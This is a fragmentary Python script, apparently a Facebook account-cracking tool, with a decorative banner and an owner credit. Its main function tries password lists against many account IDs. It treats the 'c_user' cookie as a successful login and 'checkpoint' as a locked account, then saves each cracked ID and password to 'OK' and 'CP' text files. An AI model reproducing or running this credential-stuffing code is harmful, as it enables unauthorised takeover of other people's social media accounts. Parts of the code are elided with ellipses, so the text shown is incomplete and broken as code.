...
logo=("""\033[1;97m
88""Yb    db    88 .dP"Y8 88   88 88    . 
88__dP   dPYb   88 `Ybo." 88   88 88    
88"Yb   dP__Yb  88 o.`Y8b Y8   8P 88  .o
88  Yb dP""""Yb 88 8bodP' `YbodP' 88ood8 
\33[1;37m----------------------------------------------
→   Owner      :  Raisul Islam
→   Facebook   :  Raisul 卝 Islamヅ
→   Github     :  Raisuljisan
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/RAISUL.OFFICIAL.ACCOUNT');menu()
			elif rifat in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mRAISUL\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[RAISUL-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/RAISUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[RAISUL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RAISUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[RAISUL-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RAISUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[RAISUL-OK] '+cid+' | '+ps+'\033[1;32m')
				open('RAISUL-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[RAISUL-CP] '+cid+' | '+ps+'\33[0;97m')
				open('RAISUL-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
